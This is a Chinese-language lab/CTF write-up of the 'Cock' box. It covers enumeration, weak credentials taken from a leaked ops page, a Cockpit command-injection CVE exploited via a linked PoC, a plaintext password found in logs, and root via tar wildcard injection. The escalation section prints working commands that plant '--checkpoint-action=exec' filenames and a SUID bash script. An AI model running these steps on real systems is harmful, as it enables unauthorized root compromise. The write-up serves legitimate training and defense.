# Cock 靶机复盘：Cockpit RCE 到 tar 通配符提权

> 本文记录的是隔离环境中的授权靶机复盘。弱口令登录、Cockpit 漏洞利用与提权验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Cock（Debian） |
| 作者 | mono |
| 目标地址 | 192.168.134.66 |
| 攻击机 | Kali |
| Web 栈 | nginx 1.24.0（80）、Cockpit（8090/TLS） |
| 开放端口 | 22/tcp、80/tcp、8090/tcp |
| 初始漏洞 | CVE-2026-4802（Cockpit 日志过滤命令注入） |
| 最终路径 | 遗留台账凭据 → Cockpit RCE → 日志泄露 cock 口令 → SSH → tar 通配符 → SUID bash → root |

![首页与迁移注释线索](/content/mono/image-01.png)

## 1. 攻击链概览

入口是 nginx 页面里留下的运维台账；台账给出 Cockpit 弱口令，同时点名 CVE-2026-4802。拿到 `svc_vpn` 后，日志里又掉出 `cock` 的明文口令；最终提权落在备份脚本对 `tar *` 的不安全展开。

```text
端口扫描
  → 80 注释指向 /monomono/node_inventory.html
  → 台账：svc_vpn / admin123 + CVE-2026-4802
  → Cockpit 日志过滤 RCE（svc_vpn）
  → sync.log 泄露 cock / Cock_Log_2026!
  → su / 写公钥 → SSH 登录 cock
  → /opt/cock/backup/... 定时 tar *
  → checkpoint-action 植入 SUID bash
  → root
```

## 2. 枚举：发现 Cockpit 与遗留台账

```bash
nmap -sT -sV -sC -O -p- 192.168.134.66
```

| 端口 | 服务 | 备注 |
|------|------|------|
| 22/tcp | OpenSSH 10.0p2 | 后续写公钥稳定登录 |
| 80/tcp | nginx 1.24.0 | SkyLine VPN Node Monitor |
| 8090/tcp | Cockpit（TLS） | 证书 CN=`cock`，控制台标题 “1p Operations Console” |

80 端口页面注释提到：`/monomono/node_inventory.html` 是遗留台账，Cockpit 迁移后旧凭据仍在。

![页面注释指向遗留台账](/content/mono/image-04.png)

访问台账页，直接拿到运维侧“复制友好”的凭据与漏洞提示：

| 用途 | 地址 | 用户 | 凭据 / 提示 |
|------|------|------|-------------|
| Cockpit 运维控制台 | `https://TARGET-IP:8090/` | `svc_vpn` | `admin123`（低权限） |
| Cockpit 日志页 | `https://TARGET-IP:8090/system/logs` | — | `CVE-2026-4802` |

![遗留台账中的凭据与 CVE 提示](/content/mono/image-05.png)

用 `svc_vpn / admin123` 登录 8090 上的 Cockpit。

![Cockpit 登录页](/content/mono/image-02.png) ![进入 Cockpit 控制台](/content/mono/image-03.png)

## 3. 利用：CVE-2026-4802 拿到 svc_vpn

台账写明日志页过滤器存在历史命令注入。按提示在 GitHub 找到公开 PoC：

[hakaioffsec/CVE-2026-4802](https://github.com/hakaioffsec/CVE-2026-4802)

![CVE-2026-4802 PoC 仓库](/content/mono/image-07.png) ![按 PoC 准备利用](/content/mono/image-06.png)

结合已有 Cockpit 会话触发漏洞，反弹 / 拿到 `svc_vpn` 身份的 Shell。

![CVE 利用后获得 svc_vpn Shell](/content/mono/image-08.png)

> 风险说明：该漏洞打在已认证的 Cockpit 日志过滤接口上。未授权环境不要复现；靶场里也尽量用一次性回连验证，避免长期驻留。

## 4. 横向：日志里的 cock 口令

台账里 `test-node` 的备注暗示“同步失败先看日志”。在 `svc_vpn` 下阅读：

```bash
cat /var/log/vpn-manager/sync.log
```

关键一行把明文口令写进了命令行：

```text
sshpass -p 'Cock_Log_2026!' ssh -o StrictHostKeyChecking=no cock@127.0.0.1 \
  '/usr/local/bin/subscription-sync --once'
```

![sync.log 泄露 cock 明文口令](/content/mono/image-09.png)

据此切换到 `cock`：

```bash
su - cock
# Cock_Log_2026!
```

![su 到 cock 用户](/content/mono/image-10.png)

写入 SSH 公钥后，从攻击机稳定登录并拿到 user flag：

```bash
echo "ssh-ed25519 AAAA... 111@cock" >> ~/.ssh/authorized_keys
```

```bash
ssh cock@192.168.134.66 -i cock_key
ls
# user.txt
```

## 5. 提权：备份目录里的 tar 通配符

备份相关路径落在：

```text
/opt/cock/backup/apps/vpn-manager/files
```

定时任务以 root 执行类似：

```bash
tar -czf <archive> *
```

Shell 会先展开 `*`。若目录里存在以 `-` 开头的文件名，`tar` 会把它当成选项解析。利用 `--checkpoint` / `--checkpoint-action` 即可在打包时执行命令。

![备份目录与 tar 通配符风险](/content/mono/image-11.png)

注意：`/tmp` 是 **nosuid** tmpfs，SUID bash 放那里无效。脚本应把结果写到根分区上的可写路径，例如 `/home/cock/.bashbak`。

```bash
cd /opt/cock/backup/apps/vpn-manager/files

printf '#!/bin/sh\ncp /bin/bash /home/cock/.bashbak\nchown root:root /home/cock/.bashbak\nchmod 4755 /home/cock/.bashbak\n' > pwn.sh

touch -- './--checkpoint=1' './--checkpoint-action=exec=sh pwn.sh'
```

![植入 checkpoint 文件等待备份触发](/content/mono/image-12.png)

等待下一轮备份（约 ≤60s）。`tar` 以 root 解析选项后，通过 `/bin/sh -c` 执行 `pwn.sh`。验证：

```bash
su - cock -c '/home/cock/.bashbak -p -c "id"'
# uid=1002(cock) gid=1002(cock) euid=0(root)
```

![SUID bash 获得 root](/content/mono/image-13.png)

> 防守视角：备份脚本不要对不可信目录使用未加保护的 `tar *`；应用日志也绝不该把 `sshpass -p` 明文口令打出来。

## 6. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 遗留台账 | 迁移注释 + 静态 HTML 经常比目录爆破更直接 |
| Cockpit CVE | 已认证低权限 + 日志过滤注入 = 服务账户 Shell |
| 日志凭据 | `sshpass -p` 一类调试残留是横向移动捷径 |
| tar 通配符 | 文件名可以变成选项；`checkpoint-action=exec` 是经典利用点 |
| nosuid | SUID 落点必须选允许 SUID 的挂载点，不能想当然用 `/tmp` |

## 7. 复盘

Cock 把“运维便利”串成了一条完整链：台账方便排障，Cockpit 方便管机器，日志方便同步排错，备份方便归档。每一环单独看都合理，叠在一起就从弱口令走到了 root。提权段最值得记住的不是 PoC 本身，而是 **通配符展开发生在 tar 解析选项之前**，以及 **nosuid 会让“看起来成功”的 SUID 彻底失效**。
